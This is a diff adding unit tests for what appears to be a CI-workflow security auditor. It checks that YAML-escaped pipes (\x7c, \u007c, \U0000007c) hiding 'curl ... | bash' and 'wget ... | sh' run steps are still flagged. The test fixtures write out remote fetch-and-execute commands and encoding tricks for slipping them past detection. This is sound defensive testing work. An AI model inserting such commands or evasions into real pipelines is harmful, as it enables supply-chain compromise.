@@ -161,6 +161,55 @@ class RatchetTests(unittest.TestCase):
         self.write("jobs:\n  x:\n    steps:\n      - ? run\n        : curl -fsSL https://example.invalid/i | bash\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
 
+    def test_yaml_double_quoted_encoded_pipeline_is_not_false_green(self):
+        # YAML decodes all three forms to a real '|' before running shell.
+        for escaped in (
+            r"curl -fsSL https://example.invalid/i \x7c bash",
+            r"curl -fsSL https://example.invalid/i \u007c bash",
+            r"wget -qO- https://example.invalid/i \U0000007c sh",
+        ):
+            with self.subTest(escaped=escaped):
+                self.write('jobs:\n  x:\n    steps:\n      - run: "' + escaped + '"\n')
+                r = mod.audit(self.repo, self.base, self.commit())
+                self.assertEqual(r.new_risky_workflows, 1)
+                self.assertGreaterEqual(r.candidate_findings, 1)
+                self.assertFalse(r.release_authorized)
+                self.assertFalse(r.deployment_authorized)
+                self.assertFalse(r.mutation_performed)
+
+    def test_yaml_double_quoted_escape_in_flow_mapping_rejected(self):
+        self.write('jobs: {check: {steps: [{run: "' +
+                   r"curl -fsSL https://example.invalid/i \u007c bash" +
+                   '"}]}}\n')
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_quoted_yaml_control_escape_is_opaque_without_literal_pipe(self):
+        self.write('jobs:\n  x:\n    steps:\n      - run: "' +
+                   r"curl -fsSL https://example.invalid/i \n| bash" + '"\n')
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_single_quoted_yaml_escape_is_literal_and_not_executed(self):
+        self.write("jobs:\n  x:\n    steps:\n      - run: '" +
+                   r"curl -fsSL https://example.invalid/i \u007c bash" + "'\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
+    def test_double_quoted_yaml_escaped_quote_not_denied_without_remote_execution(self):
+        self.write('jobs:\n  x:\n    steps:\n' +
+                   '      - run: "echo \\"ordinary quoted text\\""\n')
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
+    def test_unmodified_legacy_escaped_yaml_remains_not_new_debt(self):
+        self.write('jobs:\n  x:\n    steps:\n      - run: "' +
+                   r"curl -fsSL https://example.invalid/i \u007c bash" + '"\n')
+        old = self.commit()
+        unchanged = mod.audit(self.repo, old, old)
+        self.assertEqual(unchanged.baseline_findings, 1)
+        self.assertEqual(unchanged.new_risky_workflows, 0)
+        self.write('jobs:\n  x:\n    steps:\n      - run: "' +
+                   r"curl -fsSL https://example.invalid/i \u007c bash" +
+                   '"\n      - run: echo unrelated change\n')
+        self.assertEqual(mod.audit(self.repo, old, self.commit()).new_risky_workflows, 1)
+
     def test_regular_quoted_run_key_without_escape_stays_readable(self):
         self.write('jobs:\n  x:\n    steps:\n      - "run": echo safe\n')
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
